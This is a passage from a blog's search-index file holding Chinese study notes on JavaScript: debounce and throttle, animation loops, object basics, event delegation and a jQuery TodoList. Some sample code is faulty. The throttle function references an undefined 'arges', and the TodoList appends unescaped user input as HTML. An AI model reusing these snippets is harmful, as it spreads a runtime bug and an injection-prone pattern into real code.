class="language-javascript"><span class="token keyword">function</span> <span class="token function">debounce</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> delay<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> timeout <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    timeout <span class="token operator">&amp;&amp;</span> <span class="token function">clearTimeout</span><span class="token punctuation">(</span>timeout<span class="token punctuation">)</span><span class="token punctuation">;</span>    timeout <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> delay<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li><li>区分：函数节流是指一定时间间隔内js方法只跑一次；函数防抖是指频繁触发的情况下，只有足够的空闲时间，才执行代码一次；</li></ul><h4 id="动画循环"><a href="#动画循环" class="headerlink" title="动画循环"></a>动画循环</h4><pre class=" language-javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">function</span> <span class="token function">draw</span><span class="token punctuation">(</span>timestamp<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> drawStart <span class="token operator">=</span> <span class="token punctuation">(</span>timestamp <span class="token operator">||</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        diff <span class="token operator">=</span> drawStart <span class="token operator">-</span> startTime<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 使用diff确定下一步的绘制时间；使用startTime重写这次的而绘制时间</span>    startTime <span class="token operator">=</span> drawStart<span class="token punctuation">;</span>    <span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span>draw<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">var</span> requestAnimationFrame <span class="token operator">=</span> window<span class="token punctuation">.</span>requestAnimationFrame <span class="token operator">||</span> window<span class="token punctuation">.</span>mozRequestAnimationFrame <span class="token operator">||</span> window<span class="token punctuation">.</span>webkitRequestAnimationFrame <span class="token operator">||</span> window<span class="token punctuation">.</span>msRequestAnimationFrame<span class="token punctuation">;</span>  <span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span>draw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计时器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javascript语言精髓(一)</title>
      <link href="/2017/06/26/javascript-yu-yan-jing-sui/"/>
      <url>/2017/06/26/javascript-yu-yan-jing-sui/</url>
      
        <content type="html"><![CDATA[<h4 id="分析JavaScript"><a href="#分析JavaScript" class="headerlink" title="分析JavaScript"></a>分析JavaScript</h4><ol><li>Javascript是一门弱类型语言，Javascript编译器不能检测和修复错误。</li><li>Javascript有非常强大的对象字面量表示法，通过列出对象的组成部分，它们就能简单地被创建出来。</li><li>Javascript依赖于全局变量来进行连接。</li></ol><h4 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h4><ol><li>Javascript只有一个数字类型，它在内部表示为64位浮点数</li><li>NaN不等于任何值包括它自己，检测用isNaN(number)</li></ol><h4 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h4><ol><li>Javascript的<strong>简单数据类型</strong>包括：数字、字符串、布尔值、null和undefined值。</li><li>对象是属性的容器，属性名字可以是包括<strong>空字符串</strong>在内的任意字符串。属性值可以是除<strong>undefined</strong>值之外的任何值。</li><li><strong>检索</strong>：尝试从undefined的成员属性中取值会导致TypeError，可以通过<strong>&amp;&amp;</strong>运算符来避免错误：e.g.<pre><code>entity.name //undefinedentity.name.model //throw &quot;TypeError&quot;entity.name &amp;&amp; entity.name.model //undefined</code></pre></li><li><strong>引用</strong>：对象通过引用来传递，永远不会被复制。</li><li><strong>原型</strong>：<ul><li>每一个对象都连接到一个原型对象。</li><li>当我们对某个对象做出改变时，不会触及到该对象的原型。</li><li>原型连接只有在检索值时才被用到</li></ul></li><li><strong>反射</strong>：<ul><li>typeof 可以确定对象的属性类型number/string/object/undefined/function</li><li>要检测对象是否拥有独有属性，使用hasOwnProperty(<em>string</em> name)</li></ul></li><li><strong>枚举</strong>：使用for in 枚举可能会列出所有属性，包括原型中的属性。可以使用for替代（properties.length）</li><li><strong>删除</strong>： delete object.name. 不会触及原型链中的任何对象</li></ol><h4 id="减少全局变量污染"><a href="#减少全局变量污染" class="headerlink" title="减少全局变量污染"></a>减少全局变量污染</h4><ol><li>创建一个唯一的全局变量。</li><li>使用闭包进行信息隐藏。</li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JQuery实现简单的TodoList</title>
      <link href="/2016/08/27/jquery-shi-xian-jian-dan-de-todolist/"/>
      <url>/2016/08/27/jquery-shi-xian-jian-dan-de-todolist/</url>
      
        <content type="html"><![CDATA[<h4 id="效果如下"><a href="#效果如下" class="headerlink" title="效果如下"></a>效果如下</h4><iframe src="https://www.ephemeron.top/project/todolist/todolist.html" width="600px" height="400px" frameborder="0"><br></iframe><h4 id="HTML表格"><a href="#HTML表格" class="headerlink" title="HTML表格"></a>HTML表格</h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>div class<span class="token operator">=</span><span class="token string">"container"</span><span class="token operator">></span>  <span class="token operator">&lt;</span>div class<span class="token operator">=</span><span class="token string">"row"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>div class<span class="token operator">=</span><span class="token string">"col-md-5 todo"</span><span class="token operator">></span>      <span class="token operator">&lt;</span>form id<span class="token operator">=</span><span class="token string">"todoForm"</span> action<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span>        <span class="token operator">&lt;</span>input id<span class="token operator">=</span><span class="token string">"todoInput"</span> name<span class="token operator">=</span><span class="token string">"todoInput"</span> class<span class="token operator">=</span><span class="token string">"form-control"</span> placeholder<span class="token operator">=</span><span class="token string">""</span> type<span class="token operator">=</span><span class="token string">"text"</span> /<span class="token operator">></span>      <span class="token operator">&lt;</span>/form<span class="token operator">></span>      <span class="token operator">&lt;</span>dl id<span class="token operator">=</span><span class="token string">"todoList"</span><span class="token operator">></span><span class="token operator">&lt;</span>/dl<span class="token operator">></span>    <span class="token operator">&lt;</span>/div<span class="token operator">></span>  <span class="token operator">&lt;</span>/div<span class="token operator">></span><span class="token operator">&lt;</span>/div<span class="token operator">></span></code></pre><h4 id="定义提交触发事件"><a href="#定义提交触发事件" class="headerlink" title="定义提交触发事件"></a>定义提交触发事件</h4><pre class=" language-bash"><code class="language-bash">//注意：Bootstrap提交后会自动刷新页面，//如果没有进行本地存储，需加入event.preventDefault<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>避免刷新丢失数据<span class="token variable">$todoForm</span>.submit<span class="token punctuation">(</span>function<span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">{</span>  event.preventDefault<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  var value <span class="token operator">=</span>  <span class="token variable">$todoInput</span>.val<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  if<span class="token punctuation">(</span><span class="token operator">!</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    alert<span class="token punctuation">(</span><span class="token string">"输入项不能为零"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token variable">$todoList</span>.append<span class="token punctuation">(</span><span class="token string">"&lt;dd>"</span>+value+<span class="token string">"&lt;span class=\"fa fa-remove fa-fw float-right\">&lt;span>&lt;/dd>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  storeData<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$todoInput</span>.val<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  console.log<span class="token punctuation">(</span><span class="token string">'已添加一项'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="监听删除按钮点击"><a href="#监听删除按钮点击" class="headerlink" title="监听删除按钮点击"></a>监听删除按钮点击</h4><pre class=" language-bash"><code class="language-bash"><span class="token variable">$todoList</span>.on<span class="token punctuation">(</span><span class="token string">'click'</span>,<span class="token string">'.fa-remove'</span>, function<span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token variable"><span class="token variable">$(</span>this<span class="token variable">)</span></span>.parent<span class="token punctuation">(</span><span class="token punctuation">)</span>.remove<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  storeData<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  console.log<span class="token punctuation">(</span><span class="token string">'已删除一项'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Jquery </tag>
            
            <tag> Bootstrap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实现一个防抖二级导航目录涉及到的知识点</title>
      <link href="/2016/07/02/shi-xian-yi-ge-fang-dou-er-ji-dao-hang-mu-lu-she-ji-dao-de-zhi-shi-dian/"/>
      <url>/2016/07/02/shi-xian-yi-ge-fang-dou-er-ji-dao-hang-mu-lu-she-ji-dao-de-zhi-shi-dian/</url>
      
        <content type="html"><![CDATA[<h4 id="this和event-target的差别"><a href="#this和event-target的差别" class="headerlink" title="this和event.target的差别"></a>this和event.target的差别</h4><ul><li>每次触发DOM事件时会产生一个事件对象（也称event对象），此处的参数e接收事件对象。而事件对象也有很多属性和方法，其中target属性是获取触发事件对象的目标，也就是绑定事件的元素，e.target表示该DOM元素，然后在获取其相应的属性值；</li><li>this和event.target的区别：this是事件冒泡，是可变化的，先触发内部事件，由内到外的执行。但event.target不会变化，它永远是直接接受事件的目标DOM元素；</li><li>.this和event.target都是dom对象</li><li>在导航中，我们经常遇到<code>&lt;li&gt;&lt;a&gt;子目录&lt;/a&gt;&lt;/li&gt;</code>这样一个结构，我们要忽略内部的a,使得在li上任意移动都可以触发事件，就要使用<em>$(this)</em> 。  </li></ul><h4 id="CSS定位relative-absolute-fixed"><a href="#CSS定位relative-absolute-fixed" class="headerlink" title="CSS定位relative/absolute/fixed"></a>CSS定位relative/absolute/fixed</h4><table><thead><tr><th>property</th><th style="text-align:left">usage</th></tr></thead><tbody><tr><td>absolute</td><td style="text-align:left">生成绝对定位的元素，相对于 static 定位以外的第一个父元素进行定位。元素的位置通过 “left”, “top”, “right” 以及 “bottom” 属性进行规定。</td></tr><tr><td>relative</td><td style="text-align:left">生成相对定位的元素，相对于其正常位置进行定位。因此，”left:20” 会向元素的 LEFT 位置添加 20 像素。</td></tr><tr><td>fixed</td><td style="text-align:left">生成绝对定位的元素，相对于浏览器窗口进行定位。元素的位置通过 “left”, “top”, “right” 以及 “bottom” 属性进行规定。</td></tr><tr><td>static</td><td style="text-align:left">默认值。没有定位，元素出现在正常的流中（忽略 top, bottom, left, right 或者 z-index 声明）。</td></tr><tr><td>inherit</td><td style="text-align:left">规定应该从父元素继承 position 属性的值。</td></tr></tbody></table><ul><li>relative对absolute有限制作用，通常我们通过对要进行absolute定位的元素的父元素，添加定位relative;使得子元素相对于父元素进行定位。</li><li>relative对overflow有限制作用；如果子元素长宽比父元素大，overflow不能阻止溢出，需要父元素overflow:hidden并且position:relative。</li></ul><p>参考：<a href="http://web.jobbole.com/94701/" target="_blank" rel="noopener">链接</a></p><h4 id="事件委托"><a href="#事件委托" class="headerlink" title="事件委托"></a>事件委托</h4><ul><li>内存和性能：在js中，添加到页面的事件处理程序数量将直接影响到页面的整体运行性能。导致这一问题的原因是多方面的：① 每个函数都是对象，会占用内存；② 必须事先指定所有事件处理程序而导致的DOM访问次数，会延迟整个页面的交互就绪时间。③ 内存中留有过时不用的“空时间处理程序(dangling event handler)”。</li><li>事件委托利用了事件冒泡，只指定一个事件处理程序，就可以管理某一类型的所有事件，而不必给每个子元素添加事件。</li><li>移除事件处理程序：问题3可能的情况：1. 如果事件被innerHTML删除了，那么原来添加到元素中的事件处理程序极有可能无法被当作垃圾回收。可以将事件处理程序置为<code>null</code>或者使用事件委托 2. 如果在页面被卸载之前没有清理干净事件处理程序，那么它们就会滞留在内存中。每次加载完页面再卸载，内存中滞留的对象数目就会增加，因为事件处理程序占用的内存并没有释放。可以在页面卸载之前通过<code>onunload</code>时间处理程序移除所有事件处理程序。</li></ul><h4 id="防抖函数"><a href="#防抖函数" class="headerlink" title="防抖函数"></a>防抖函数</h4><ul><li>定义：多次触发事件后，事件处理函数只执行一次，并且是在触发操作结束时执行。</li><li>原理：对处理函数进行延时操作，若设定的延时到来之前，再次触发事件，则清除上一次的延时操作定时器，重新定时。<pre><code>function debounce(method, delay) {let timer = null;return function() {  let that = this,      args = arguments;  timer &amp;&amp; clearTimeout(timer);  timer = setTimeout(function() {    method.apply(that, args);    },delay);}}</code></pre><h4 id="节流函数"><a href="#节流函数" class="headerlink" title="节流函数"></a>节流函数</h4></li><li>定义：触发函数事件后，短时间间隔内无法连续调用，只有上一次函数执行后，过了规定的时间间隔，才能进行下一次的函数调用。</li><li>原理：对处理函数进行延时操作，若设定的延时到来之前，再次触发事件，则清除上一次的延时操作定时器，重新定时。<pre><code>function throttle(method, mustRunDelay) {let timer, args = arguments, start;return function Loop() {  let that = this;  let now = Date.now();  if(!start) {    start = now;  }  if(timer) {    clearTimeout(timer);  }  if(now - start &gt;= mustRunDelay) {    method.apply(that, arges);    start = now;  } else {    timer = setTimeout(function() {      Loop.apply(that, args);      }, 50);  }}}</code></pre></li></ul><h4 id="localStorage-sessionStorage-cookie"><a href="#localStorage-sessionStorage-cookie" class="headerlink" title="localStorage / sessionStorage / cookie"></a>localStorage / sessionStorage / cookie</h4><p>tips: 这里有个坑是这些存储在本地环境中，使用ie浏览器会报错</p><h4 id="参考博客："><a href="#参考博客：" class="headerlink" title="参考博客："></a>参考博客：</h4><ul><li><a href="https://www.cnblogs.com/chenqf/p/7986725.html" target="_blank" rel="noopener">JS奇淫巧技：防抖函数与节流函数</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> Jquery </tag>
            
            <tag> this </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
